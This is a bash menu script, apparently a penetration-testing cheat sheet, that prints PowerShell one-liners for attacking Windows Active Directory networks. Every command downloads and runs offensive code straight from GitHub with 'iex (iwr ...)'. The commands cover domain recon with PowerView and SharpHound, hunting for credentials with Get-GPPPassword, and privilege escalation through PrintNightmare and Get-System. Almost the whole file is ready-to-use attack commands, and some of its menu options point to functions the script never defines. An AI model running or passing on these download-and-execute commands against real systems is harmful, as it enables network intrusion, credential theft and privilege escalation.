# Test

################################################################################
# Variables                                                                    #
################################################################################

LocalIP="10.10.14.10";		#
LocalPort="8080";		#
Username="Moe";			#
NQUsername="";			#
Password="Password";			#
Domain="security.local";			#
NQDomain="";			#
IP="10.10.10.10";				#
NQIP="";			#
LDAP="";			#
baseLDAP="";			#
DC="";				#
NS="IP";			#
Version="v2.1"			#
MainCheck="1"			#


################################################################################
# Colors                                                                       #
################################################################################

RESTORE='\033[0m'

RED='\033[00;31m'
GREEN='\033[00;32m'
YELLOW='\033[00;33m'
BLUE='\033[00;34m'
PURPLE='\033[00;35m'
CYAN='\033[00;36m'
LIGHTGRAY='\033[00;37m'

LRED='\033[01;31m'
LGREEN='\033[01;32m'
LYELLOW='\033[01;33m'
LBLUE='\033[01;34m'
LPURPLE='\033[01;35m'
LCYAN='\033[01;36m'
WHITE='\033[01;37m'

IBLUE='\033[02;34m'
ICYAN='\033[02;36m'

BloodHoundRepo="https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/";
EmpireRepo="https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/";
GetSystemTechniquesRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/";
JAWSRepo="https://raw.githubusercontent.com/411Hall/JAWS/master/";
LazagneRepo="https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe";
NishangRepo="https://raw.githubusercontent.com/samratashok/nishang/master/";
PentestFactoryRepo="https://raw.githubusercontent.com/pentestfactory/Invoke-DCSync/main/";
PowerSharpPack="https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/";
PowerSploitRepo="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/";
PowerSploitRepo="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/";
S3cur3Th1sSh1tRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/";
SecListsRepo="https://github.com/danielmiessler/SecLists/";

iwr="iex (iwr -usebasicparsing "
DownloadMethod="$iwr"



Internal_Menu_Main(){

    clear

echo -e ""
echo -e ""
echo -e ""
echo -ne " What would you like to do?



        1)  ->  [ Recon ]
        2)  ->  [ Privilege Escalation ]
        3)  ->  [ Relay Attacks ]
        4)  ->  [ Password Spraying ]
"
        read a
        case $a in
	        1) Internal_Menu_Recon ;;
	        2) Internal_Menu_Privilege_Escalation ;;
	        3) Internal_Menu_Relay_Attacks ;;
	        4) Internel_Menu_Password_Spraying ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
}


Internal_Menu_Recon(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -ne " Select Recon Type



        1)  ->  [ Local Host Recon ]
        2)  ->  [ Domain Recon ]
        3)  ->  [ Network Recon ] 
        4)  ->  [ File and Share Recon ]
"
        read a
        case $a in
	        1) Internal_Menu_Recon_Local_Host ;;
	        2) Internal_Menu_Recon_Domain ;;
	        3) Internal_Menu_Recon_Network ;;
	        4) Internal_Menu_Recon_File_Share ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
}



Internal_Menu_Recon_Local_Host(){

    clear

echo -e ""
echo -e ""
echo -e ""      
echo -e "${LGREEN}Local Enumeration${RESTORE}"
echo -e ""
echo -e "${IBLUE}HostRecon${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/HostRecon.ps1);Invoke-HostRecon"
echo -e ""
echo -e "${IBLUE}Invoke-Seatbelt${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/Invoke-Seatbelt.ps1);Invoke-Seatbelt -Command -group=all"
echo -e ""
echo -e "${IBLUE}Invoke-WinEnum${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/Invoke-WinEnum.ps1);Invoke-WinEnum"
echo -e ""
echo -e "${IBLUE}JAWS${RESTORE}"
echo -e "$DownloadMethod "$JAWSRepo"jaws-enum.ps1);JAWS-ENUM"
echo -e ""
echo -e ""
}

Internal_Menu_Recon_Domain(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -ne " Select Domain Recon Type



        1)  ->  [ Domain Computers and Servers ]
        2)  ->  [ Domain Users ]
"
        read a
        case $a in
	        1) Internal_Menu_Recon_Domain_Computers_Servers ;;
	        2) Internal_Menu_Recon_Domain_Users ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
}


Internal_Menu_Recon_Domain_Computers_Servers(){

    clear
 
echo -e ""
echo -e ""
echo -e ""   
echo -e "${LGREEN}Computer Enumeration${RESTORE}"
echo -e ""
echo -e "${IBLUE}All Computers${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -Properties Name,OperatingSystem,distinguishedname "
echo -e ""
echo -e "${IBLUE}Ping Alive Computers${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -Ping"
echo -e ""
echo -e "${IBLUE}Computers by Operating System${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -OperatingSystem 'Windows 10*'"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -OperatingSystem 'Windows 7*'"  
echo -e ""
echo -e "${IBLUE}Servers by Operating System${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainComputer -OperatingSystem 'Windows Server*'"
echo -e ""
echo -e ""


}






Internal_Menu_Recon_Network(){

    clear

echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Network Enumeration${RESTORE}"
echo -e ""
echo -e "${IBLUE}Invoke-ARPScan${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/network/Invoke-ARPScan.ps1);Invoke-ARPScan -CIDR '<CIDR>'"
echo -e ""
echo -e "${IBLUE}Invoke-PortScan${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/network/Invoke-Portscan.ps1);Invoke-Portscan -Hosts '<CIDR> or <IP>' -TopPorts 50 -Open -GrepOut Scan.txt"
echo -e ""
echo -e "${IBLUE}Invoke-Bloodhound${RESTORE}"
echo -e "$DownloadMethod "$BloodHoundRepo"Collectors/SharpHound.ps1);Invoke-Bloodhound -CollectionMethod All"
echo -e ""
echo -e ""

}

Internal_Menu_Recon_File_Share() {

    clear
    
echo -e ""
echo -e ""
echo -e "" 
echo -e "${IBLUE}Share Enumeration${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-ShareFinder -verbose"
echo -e ""
echo -e "${IBLUE}File Enumeration${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-FileFinder -verbose"
echo -e ""
echo -e ""

}

Internal_Menu_Privilege_Escalation() {

    clear

echo -e ""
echo -e ""
echo -e ""
echo -ne " Select Privilege Escalation Type



        1)  ->  [ Checks ]
        2)  ->  [ Exploits ]
"
        read a
        case $a in
	        1) Internal_Menu_Privilege_Escalation_Checks ;;
	        2) Internal_Menu_Privilege_Escalation_Exploits ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
}

Internal_Menu_Privilege_Escalation_Checks(){

    clear
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Tools${RESTORE}"
echo -e ""
echo -e "${IBLUE}Invoke-WinPEAS${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/Invoke-winPEAS.ps1);Invoke-WinPEAS"
echo -e ""
echo -e "${IBLUE}PowerUp${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/PowerUp.ps1);Invoke-AllChecks"
echo -e ""
echo -e "${IBLUE}Get-GPPPassword${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/Get-GPPPassword.ps1);Get-GPPPassword"
echo -e ""
echo -e "${IBLUE}Sherlock${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/Sherlock.ps1);Find-AllVulns"
echo -e ""
echo -e "${IBLUE}PrivescCheck${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/PrivescCheck.ps1);Invoke-PrivescCheck"
echo -e ""
echo -e ""

}

Internal_Menu_Privilege_Escalation_Exploits(){

    clear
echo -e ""
echo -e ""
echo -e ""
echo -e "${IBLUE}Invoke-Printnightmare${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/Invoke-Printnightmare.ps1);Invoke-Nightmare"
echo -e ""
echo -e "${IBLUE}Get-System${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/Get-System.ps1);Get-System"
echo -e ""
echo -e ""   
  
}





Main_Menu(){

    clear

echo -ne "
            Main Menu

        1) -> Internal
        2) -> External (WIP)
"
        read a
        case $a in
	        1) Internal_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
}

# Call the menu function
Main_Menu
